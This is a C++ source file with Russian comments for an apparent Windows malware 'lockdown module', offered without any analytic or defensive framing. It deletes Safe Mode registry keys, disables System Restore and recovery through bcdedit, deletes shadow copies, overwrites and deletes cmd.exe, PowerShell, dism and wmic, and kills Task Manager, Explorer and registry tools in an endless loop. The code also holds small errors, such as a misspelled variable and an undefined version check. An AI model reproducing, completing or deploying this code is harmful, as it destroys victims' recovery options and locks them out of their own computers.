#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <shlwapi.h>

namespace fs = std::filesystem;

// Проверка версии Windows
bool IsWindows10OrLater() {
    OSVERSIONINFOEXW osvi = { sizeof(osvfi) };
    osvi.dwMajorVersion = 10;
    osvi.dwMinorVersion = 0;
    DWORDLONG conditionMask = 0;
    VER_SET_CONDITION(conditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
    VER_SET_CONDITION(conditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);
    return VerifyVersionInfoW(&osvi, VER_MAJORVERSION | VER_MINORVERSION, conditionMask) != FALSE;
}

bool IsWindows8OrLater() {
    OSVERSIONINFOEXW osvi = { sizeof(osvfi) };
    osvi.dwMajorVersion = 6;
    osvi.dwMinorVersion = 2;
    DWORDLONG conditionMask = 0;
    VER_SET_CONDITION(conditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
    VER_SET_CONDITION(conditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);
    return VerifyVersionInfoW(&osvi, VER_MAJORVERSION | VER_MINORVERSION, conditionMask) != FALSE;
}

void BlockSafeModeUniversal() {
    // Реестр — работает на всех версиях
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegDeleteKeyA(hKey, "Minimal");
        RegDeleteKeyA(hKey, "Network");
        RegDeleteKeyA(hKey, "AlternateShell");
        RegCloseKey(hKey);
    }
    
    // Отключаем восстановление системы (работает везде)
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableConfig /t REG_DWORD /d 1 /f");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f");
    
    // Отключаем безопасный режим через реестр (работает везде)
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Option\" /v OptionValue /t REG_DWORD /d 1 /f");
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Option\" /v UseAlternateShell /t REG_DWORD /d 0 /f");
    
    // Для Windows 10/11 добавляем bcdedit
    if (IsWindows8OrLater()) {
        system("bcdedit /set {default} safeboot minimal 2>nul");
        system("bcdedit /set {default} safeboot network 2>nul");
        system("bcdedit /deletevalue {default} safeboot 2>nul");
        system("bcdedit /set {current} recoveryenabled no 2>nul");
        system("bcdedit /set {current} bootstatuspolicy ignoreallfailures 2>nul");
        system("bcdedit /set {default} bootmenupolicy legacy 2>nul");
        system("bcdedit /set {default} displaybootmenu no 2>nul");
        system("bcdedit /set {default} advancedoptions no 2>nul");
        system("bcdedit /set {default} recoveryenabled no 2>nul");
        system("bcdedit /set {default} badmemoryaccess no 2>nul");
    }
    
    // Для Windows 7 используем старые методы
    if (!IsWindows8OrLater()) {
        // Удаляем точки восстановления через VSS (работает на Win7)
        system("vssadmin delete shadows /all /quiet 2>nul");
        system("wmic shadowcopy delete 2>nul");
    }
}

void DeleteCmdExeUniversal() {
    try {
        std::vector<std::string> cmdPaths = {
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\SysWOW64\\cmd.exe",
            "C:\\Windows\\System32\\dism.exe",
            "C:\\Windows\\System32\\wbem\\wmic.exe"
        };
        
        // PowerShell есть только на Win7+, но мы добавим для всех
        if (IsWindows7OrLater()) {
            cmdPaths.push_back("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            cmdPaths.push_back("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe");
        }
        
        for (const auto& path : cmdPaths) {
            if (fs::exists(path)) {
                // Перезаписываем файл
                for (int i = 0; i < 5; i++) {
                    std::ofstream out(path, std::ios::binary);
                    if (out) {
                        for (int j = 0; j < 1024; j++) {
                            out.put(static_cast<char>(0x00));
                        }
                        out.close();
                    }
                }
                fs::remove(path);
            }
        }
        
        // Блокируем командную строку через реестр (работает везде)
        system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /t REG_DWORD /d 2 /f");
        system("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /t REG_DWORD /d 2 /f");
        
        // Для Win10/11 блокируем ещё и PowerShell
        if (IsWindows10OrLater()) {
            system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\" /v EnableScripts /t REG_DWORD /d 0 /f");
            system("reg add \"HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\" /v EnableScripts /t REG_DWORD /d 0 /f");
        }
        
    } catch (...) {}
}

void KillProcessesUniversal() {
    std::vector<std::string> killList = {
        "taskmgr.exe",
        "cmd.exe",
        "powershell.exe",
        "regedit.exe",
        "msconfig.exe",
        "control.exe",
        "explorer.exe"
    };
    
    // Добавляем специфичные для разных версий
    if (IsWindows10OrLater()) {
        killList.push_back("SystemSettings.exe");
        killList.push_back("StartMenuExperienceHost.exe");
    }
    
    while (true) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(snapshot, &pe)) {
                do {
                    for (const auto& target : killList) {
                        if (_stricmp(pe.szExeFile, target.c_str()) == 0) {
                            HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                            if (process) {
                                TerminateProcess(process, 0);
                                CloseHandle(process);
                            }
                            break;
                        }
                    }
                } while (Process32Next(snapshot, &pe));
            }
            CloseHandle(snapshot);
        }
        
        // Убиваем процессы через taskkill (работает везде)
        system("taskkill /f /im explorer.exe 2>nul");
        system("taskkill /f /im taskmgr.exe 2>nul");
        system("taskkill /f /im cmd.exe 2>nul");
        system("taskkill /f /im powershell.exe 2>nul");
        
        Sleep(1000);
    }
}

void InitializeLockdownModule() {
    std::thread safeModeThread(BlockSafeModeUniversal);
    safeModeThread.detach();
    
    std::thread cmdThread(DeleteCmdExeUniversal);
    cmdThread.detach();
    
    std::thread killThread(KillProcessesUniversal);
    killThread.detach();
}
